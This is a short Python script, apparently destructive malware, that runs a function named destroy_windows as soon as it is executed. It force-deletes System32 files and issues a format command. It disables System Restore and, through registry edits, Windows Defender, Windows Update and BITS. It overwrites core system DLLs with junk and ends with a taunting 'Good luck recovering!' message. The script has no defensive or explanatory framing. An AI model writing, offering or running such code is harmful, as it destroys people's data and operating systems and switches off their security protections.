import os

def destroy_windows():
    
    os.system("del C:\\Windows\\System32\\. /f /s /q")
    
    os.system("format /fs:NTFS /q /y")
    
    os.system("wmic.exe /namespace:\\\\root\\default path SystemRestore call Disable")
    
    os.system("reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinDefend /v Start /t REG_DWORD /d 4 /f")
    os.system("reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\wuauserv /v Start /t REG_DWORD /d 4 /f")
    os.system("reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\BITS /v Start /t REG_DWORD /d 4 /f")
    
    with open("C:\\Windows\\System32\\ntdll.dll", "wb") as file:
        file.write(b"corrupted")
    
    with open("C:\\Windows\\System32\\kernel32.dll", "wb") as file:
        file.write(b"corrupted")
    
    with open("C:\\Windows\\System32\\user32.dll", "wb") as file:
        file.write(b"corrupted")
    
    os.system("msg * Your Windows system has been destroyed. Good luck recovering!")
destroy_windows()
